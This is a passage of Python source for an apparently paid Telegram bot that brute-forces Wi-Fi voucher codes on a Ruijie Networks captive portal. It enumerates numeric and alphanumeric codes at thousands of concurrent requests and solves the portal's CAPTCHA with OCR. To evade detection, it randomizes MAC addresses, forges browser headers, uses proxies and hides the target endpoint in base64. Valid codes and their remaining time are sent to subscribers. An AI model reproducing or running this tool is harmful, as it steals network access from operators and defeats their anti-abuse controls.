    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0, stats=None, found_details=None):
    stats = stats or {}
    captcha_count = stats.get("captcha", 0)
    ban_count = stats.get("ban", 0)
    details = "\n".join(found_details[-5:]) if found_details else ""
    progress_text = (
        "👁️🔴━━━━━━━━━━━━🟣👁️ EYES SCANNER 👁️🟣━━━━━━━━━━━━🔴👁️\n"
        "🔍 Scanning Codes...\n"
        f"📦 Checked  ┃ {checked:,}\n"
        f"⚡ Speed    ┃ {speed:,.0f}/min\n"
        f"✅ Found    ┃ {found}\n"
        f"🔄 Retry    ┃ {retries}\n"
        f"🚫 Ban      ┃ {ban_count:,}\n"
        f"🧩 Captcha  ┃ {captcha_count:,}\n"
        "📊 STATUS ┃ 🟢 RUNNING\n"
        "👁️ SHARINGAN × SIX EYES ⚡ SYSTEM ACTIVE"
    )
    # Found code and Plan/Time details are appended only for the final result.
    return progress_text + (f"\n\n{details}" if details else "")

BATCH_SIZE = 1000
SPEED_MODE = "normal"
# Fixed speed profiles: do not auto-increase/decrease these values at runtime.
SPEED_PROFILES = {
    "slow": {"concurrency": 3500, "interval": 1000, "batch_size": 1000, "delay": 3.0},
    "normal": {"concurrency": 5500, "interval": 1000, "batch_size": 1000, "delay": 2.0},
    "fast": {"concurrency": 8000, "interval": 1000, "batch_size": 1000, "delay": 1.0},
}
SPEED_DELAY = SPEED_PROFILES[SPEED_MODE]["delay"]


def apply_speed_profile(mode):
    """Apply only one of the fixed profiles; no adaptive speed changes are allowed."""
    global SPEED_MODE, CONCURRENCY, BATCH_SIZE, SPEED_DELAY
    if mode not in SPEED_PROFILES:
        mode = "normal"
    profile = SPEED_PROFILES[mode]
    SPEED_MODE = mode
    CONCURRENCY = profile["concurrency"]
    BATCH_SIZE = profile["batch_size"]
    SPEED_DELAY = profile["delay"]
    return profile
SPEED_SETTINGS_FILE = "speed_settings.json"


def load_speed_settings():
    try:
        with open(SPEED_SETTINGS_FILE, "r", encoding="utf-8") as f:
            saved_mode = json.load(f).get("mode")
        if saved_mode in SPEED_PROFILES:
            apply_speed_profile(saved_mode)
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        pass


def save_speed_settings():
    tmp = SPEED_SETTINGS_FILE + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"mode": SPEED_MODE}, f)
    os.replace(tmp, SPEED_SETTINGS_FILE)


load_speed_settings()

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                print(f"[captcha] solved sid={session_id} code={text}")
                return session_id, text
        return None, None

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    speed_config = dict(SPEED_PROFILES.get(SPEED_MODE, SPEED_PROFILES["normal"]))
    scan_concurrency = speed_config["concurrency"]
    scan_batch_size = speed_config["batch_size"]
    scan_delay = speed_config["delay"]
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_stats[chat_id] = {"captcha": 0, "ban": 0}
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    scan_sem = asyncio.Semaphore(scan_concurrency)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(scan_batch_size):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 60:
                try:
                    auth_list, _ = await get_file_content("auth_list.json")
                except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
                    logger.warning(
                        "Key expiry check unavailable for chat_id=%s: %s",
                        chat_id, type(exc).__name__,
                    )
                    try:
                        await bot.send_message(
                            chat_id,
                            "⚠️ Key status စစ်ဆေးမရသေးပါ။ Scan ကို လုံခြုံစွာ ခဏရပ်ထားပါသည်။"
                        )
                    except Exception:
                        logger.exception("Unable to notify key-check failure chat_id=%s", chat_id)
                    return
                # Admin is permanently authorized by ADMIN_ID; do not consult
                # auth_list.json or apply user-key expiration to the Admin.
                is_admin = str(chat_id).strip() == ADMIN_ID
                paid_record = paid_users.get(str(chat_id))
                has_paid_access = _paid_record_active(paid_record)
                if not is_admin and (
                    (str(chat_id) not in auth_list or not check_key_expiration(auth_list[str(chat_id)]))
                    and not has_paid_access
                ):
                    approve[chat_id] = False
                    logger.info("Paid/auth key expired; stopping scan chat_id=%s", chat_id)
                    try:
                        await bot.send_message(
                            chat_id,
                            "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။ Scan ကို ရပ်လိုက်ပါသည်။"
                        )
                    except Exception:
                        logger.exception("Unable to notify expired key chat_id=%s", chat_id)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with scan_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id, message=message,
                        notify_result=True
                    )

            batch_results = await asyncio.gather(
                *[_check(code) for code in batch],
                return_exceptions=True,
            )
            task_errors = [result for result in batch_results if isinstance(result, BaseException)]
            if task_errors:
                logger.warning(
                    "Scan batch completed with %s handled task errors for chat_id=%s",
                    len(task_errors), chat_id,
                )
            if scan_delay > 0:
                await asyncio.sleep(scan_delay)
            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            # Keep found codes and Plan/Time details out of the live progress message.
            # They remain available in the final completion result below.
            text = format_progress(
                checked, total, speed, found, retries,
                scan_stats.get(chat_id)
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = format_progress(
                checked, total or checked, 0, final_found, final_retries,
                scan_stats.get(chat_id),
                success_texts.get(chat_id, [])
            )
            finish_text = finish_text.replace("🔍Scanning Codes...", "🔍Scanning Completed")
            finish_text = finish_text.replace("📊Progress : 100.00%", "📊Progress : 100%")
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        scan_stats.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        scan_stats.pop(chat_id, None)


def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    timeout = aiohttp.ClientTimeout(total=45, connect=15, sock_read=35)
    last_error = None
    for attempt in range(1, 4):
        try:
            async with session.get(
                session_url,
                headers=headers,
                allow_redirects=True,
                timeout=timeout,
                **proxy_request_kwargs(),
            ) as req:
                response = str(req.url)
                response_text = await req.text(errors="ignore")
                location = req.headers.get("Location", "")
                session_id = (
                    extract_session_id(response)
                    or extract_session_id(location)
                    or extract_session_id(response_text)
                )
                if session_id:
                    return session_id
                print(f"Session ID not found: status={req.status}, attempt={attempt}")
                return previous_session_id
        except (aiohttp.ClientError, asyncio.TimeoutError, ValueError) as exc:
            last_error = exc
            if attempt < 3:
                delay = min(2 ** (attempt - 1), 4)
                print(f"Session ID fetch retry {attempt}/3 after {type(exc).__name__}; waiting {delay}s")
                await asyncio.sleep(delay)
    print(f"Session ID Fetch Error after 3 attempts: {type(last_error).__name__}: {last_error}")
    return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, notify_result=True):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return

            auth_code = None
            if not recheck:
                scan_stats.setdefault(chat_id, {"captcha": 0, "ban": 0})["captcha"] += 1
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    logger.warning(
                        "Captcha request failed chat_id=%s: %s",
                        chat_id, type(e).__name__,
                    )
                except Exception:
                    logger.exception("Unexpected captcha handling error chat_id=%s", chat_id)
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(
                    post_url, json=data, headers=headers, **proxy_request_kwargs()
                ) as req:
                    response = await req.text()
                    try:
                        resp_json = json.loads(response)
                    except json.JSONDecodeError:
                        resp_json = {"raw_response": response[:300]}
                    logger.info(
                        "Voucher response status=%s attempt=%s message=%s",
                        req.status, _attempt + 1, resp_json.get("message"),
                    )
                    if req.status in {401, 403} or resp_json.get("message") == "Authentication failed":
                        logger.warning(
                            "Portal authentication rejected the supplied session/code request; no bypass attempted"
                        )
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.warning(
                    "Voucher connection failed chat_id=%s attempt=%s: %s",
                    chat_id, _attempt + 1, type(e).__name__,
                )
                return
            except Exception:
                logger.exception("Unexpected voucher request error chat_id=%s", chat_id)
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        if response and "ban" in response.lower() and not recheck:
            scan_stats.setdefault(chat_id, {"captcha": 0, "ban": 0})["ban"] += 1
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code
        })
        if message and notify_result:
            try:
                match = re.search(r"Plan:\s*(.*?)\s*\|\s*⏳\s*Time:\s*(.*)", expire_date)
                plan = match.group(1).strip() if match else "N/A"
                time_left = match.group(2).strip() if match else expire_date
                result_card = (
                    "╭───「 CODE RESULT 」───╮\n\n"
                    f"🔑 {code}\n"
                    f"👹 {message.from_user.first_name or 'Unknown'}\n"
                    "📋 PLAN\n"
                    f"➜ {plan}\n\n"
                    "⏳ TIME\n"
                    f"➜ {time_left}\n\n"
                    "📡 RESULT\n"
                    "➜ 🟢 SUCCESS"
                )
                await bot.send_message(chat_id=message.chat.id, text=result_card)
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message and notify_result:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Limited Codes:\n\n{limited_line}"
                            )
                            limited_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                headers=headers,
                **proxy_request_kwargs()
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
    last_error = None
    for attempt in range(1, 4):
        try:
            async with session.get(
                'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
                params=params,
                headers=headers,
                timeout=timeout,
                **proxy_request_kwargs(),
            ) as req:
                if req.status != 200:
                    body = await req.read()
                    if req.status in {429, 500, 502, 503, 504} and attempt < 3:
                        delay = min(2 ** (attempt - 1), 4)
                        logger.warning(
                            "Captcha image HTTP %s; retrying in %ss",
                            req.status, delay,
                        )
                        await asyncio.sleep(delay)
                        continue
                    raise aiohttp.ClientResponseError(
                        req.request_info, req.history,
                        status=req.status, message=f"captcha image HTTP {req.status}",
                        headers=req.headers,
                    )
                return await req.read()
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            last_error = exc
            if attempt < 3:
                delay = min(2 ** (attempt - 1), 4)
                logger.warning(
                    "Captcha image attempt %s/3 failed with %s; retrying in %ss",
                    attempt, type(exc).__name__, delay,
                )
                await asyncio.sleep(delay)
    raise RuntimeError("captcha image request failed after 3 attempts") from last_error

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
    last_error = None
    for attempt in range(1, 4):
        try:
            async with session.post(
                'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
                headers=headers,
                json=json_data,
                timeout=timeout,
                **proxy_request_kwargs(),
            ) as req:
                if req.status in {429, 500, 502, 503, 504} and attempt < 3:
                    delay = min(2 ** (attempt - 1), 4)
                    logger.warning(
                        "Captcha verify HTTP %s; retrying in %ss",
                        req.status, delay,
                    )
                    await asyncio.sleep(delay)
                    continue
                data = await req.json(content_type=None)
                logger.info(
                    "Captcha verify response status=%s success=%s",
                    req.status, data.get("success"),
                )
                # A normal CAPTCHA rejection is not a transport error and is
                # deliberately not retried here.
                return session_id if req.status == 200 and data.get("success") is True else None
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            last_error = exc
            if attempt < 3:
                delay = min(2 ** (attempt - 1), 4)
                logger.warning(
                    "Captcha verify attempt %s/3 failed with %s; retrying in %ss",
                    attempt, type(exc).__name__, delay,
                )
                await asyncio.sleep(delay)
    raise RuntimeError("captcha verify request failed after 3 attempts") from last_error


async def start_polling():
    backoff = 5
    while True:
        try:
            logger.info("Starting Telegram polling")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            logger.warning("Telegram polling stopped; restarting")
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            logger.warning("Polling connection error: %s; reconnecting in %ss", exc, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception:
            logger.exception("Unexpected polling error; reconnecting in %ss", backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

def async_exception_handler(loop, context):
    exception = context.get("exception")
    if exception:
        logger.error("Unhandled asyncio task exception", exc_info=(type(exception), exception, exception.__traceback__))
    else:
        logger.error("Unhandled asyncio task error: %s", context.get("message"))

async def main():
    global session, _connector
    asyncio.get_running_loop().set_exception_handler(async_exception_handler)
    logger.info("Bot startup initiated")
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(
        limit=5000,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        logger.info("Closing HTTP session and connector")
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
